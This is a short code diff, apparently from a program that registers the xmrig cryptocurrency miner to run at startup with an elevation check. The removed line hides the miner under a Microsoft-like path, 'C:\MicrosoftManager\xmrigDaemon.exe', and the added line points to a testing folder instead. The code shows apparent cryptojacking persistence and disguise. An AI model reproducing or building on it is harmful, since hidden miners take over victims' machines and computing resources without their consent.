@@ -71,7 +71,7 @@ int AutoRun(TCHAR* path, BOOL Admin) {
 
 
 int main(int argc, char **argv) {
-    AutoRun(L"C:\\MicrosoftManager\\xmrigDaemon.exe", IsElevated());
+    AutoRun(L"C:\\TestingFolder\\xmrig.exe", IsElevated());
     App app(argc, argv);
     return app.exec();
 }
